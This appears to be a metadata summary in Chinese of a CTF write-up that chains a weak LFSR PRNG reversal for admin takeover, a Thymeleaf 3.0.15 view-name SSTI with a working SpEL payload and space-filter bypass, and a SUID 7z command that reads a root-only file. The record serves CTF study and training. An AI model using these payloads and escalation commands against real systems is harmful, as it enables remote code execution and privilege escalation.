...
quality: high
full_path: 软件系统安全赛-Thymeleaf_3.0.15_视图名注入_+_PRNG_逆向：完整_RCE_到_Root_提权.full.md
meta_path: 软件系统安全赛-Thymeleaf_3.0.15_视图名注入_+_PRNG_逆向：完整_RCE_到_Root_提权.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 软件系统安全赛-Thymeleaf 3.0.15 视图名注入 + PRNG 逆向:完整 RCE 到 Root 提权。软件系统安全赛Thymeleaf 3.0.15视图名注入SSTI + 48-bit LFSR PRNG逆向破解admin密码 + 7z SUID提权读取root-only /flag,完整PRNG→Admin takeover→SSTI→RCE→SUID链。。关键路径：弱PRN...
category: web
...
contest_type: open
wp_url: https://www.ctfiot.com/302146.html
reasoning_chain:
- Java 48-bit LFSR feedback=((state>>47)^(state>>46)^(state>>43)^(state>>42))&1 → 触发点：弱 PRNG
- 注册用户获取 16 位数字密码（完整 PRNG 状态）→ admin 密码比注册用户早 6 步
- 假设：adminPwd#10 → user1-5#11-15 → registered#16 → 需逆向 6 步
- 动作：每步 2 候选（共 2^6=64 候选）→ 正向验证筛正确状态 → 观察：得到 admin 密码
- 'Thymeleaf 3.0.15 SSTI：''return "admin :: " + section'' 视图名拼接 → 触发点：SSTI 入口'
- 绕：__|$${'{SpEL}'}|__ 预处理表达式 + literal substitution
- payload：__|$${'{#response.setHeader("X-Poc","1")?:"main"}'}|__ → 触发 SpEL 执行
- 绕 3.0.15 空格过滤：用 new.ClassName（点代替空格）→ 读 /flag
- 动作：new.java.util.Scanner(new.java.io.File('/flag')).useDelimiter('\\A').next()
- /flag 是 -r-------- root，SUID /usr/bin/7z → 7z a -ttar -an -so /flag 2>/dev/null | tar -xOf -
failed_attempts:
- 试图用 __${'...'}__ → 失败：3.0.15 改了预处理机制
- 试图用 new ClassName → 失败：空格被过滤
- 试图直接 tar /flag → 失败：root-only 文件非 SUID tar 读不到
key_observations:
- 48-bit LFSR PRNG 可逆向（2^6=64 候选），正向验证筛掉
- Thymeleaf 视图名拼接 + __|$${'{SpEL}'}|__ 是稳定 SSTI 向量
- 7z SUID + tar pipe 是 Linux 读 root-only 文件的稳定技巧
- new.ClassName（点代替空格）绕 3.0.15 空格过滤
prerequisites:
- LFSR 线性反馈移位寄存器逆向
- Thymeleaf 模板引擎视图解析机制
- Spring SpEL 表达式注入
- Linux SUID 提权（7z/tar/find 等）
---
